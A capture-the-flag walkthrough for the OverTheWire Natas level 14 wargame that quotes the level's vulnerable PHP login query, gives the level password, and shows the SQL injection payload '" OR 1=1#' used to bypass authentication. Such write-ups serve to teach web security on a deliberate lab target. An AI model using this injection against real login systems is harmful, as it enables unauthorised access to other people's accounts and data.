# Natas14

## Level Description
- **Username**: natas14
- **Password**: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
- **URL**: http://natas14.natas.labs.overthewire.org

## Method of Solving
![image-1](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas14/image-1.png)

Here is the PHP code for this challenge:

![image-2](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas14/image-2.png)

We got an SQL injection, if we check the query we can see that we can easly bypass the authentication:
```bash
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
If we put `" OR 1=1#` into username field, we can see that we successfully take over the logic of the query and force it to return _true_ (the `#` will make sure that remaining of the query will be passed as comment):
```bash
SELECT * from users where username="user" OR 1=1# " and password="pass"
```
So, we solved the challenge:

![image-3](https://github.com/dungcngo/hackerhorse/blob/main/walkthroughs/overthewire/natas/natas14/image-3.png)


***You are welcome!***
